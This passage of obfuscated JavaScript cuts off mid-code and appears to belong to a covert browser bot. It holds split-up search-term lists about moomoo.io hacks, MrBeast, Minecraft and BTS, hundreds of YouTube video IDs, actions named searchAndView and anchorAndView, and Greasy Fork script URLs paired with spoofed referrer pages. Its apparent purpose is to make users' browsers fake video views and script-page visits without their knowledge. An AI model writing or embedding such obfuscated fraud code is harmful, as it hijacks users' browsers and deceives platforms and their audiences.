searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + V(0x2) + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xdd * 0x3 + 0x164a + -0x18d7)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x1718 + -0x1a * -0x13 + 0x7b * -0x34)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + V(0x0) + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1 * 0x2c9 + -0x123b * 0x2 + 0x2742);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    W(0xd) + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    X(0x1, '7xdN') + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + X(0x4, '@pOb')
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': X(0xc, 'ci5[') + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
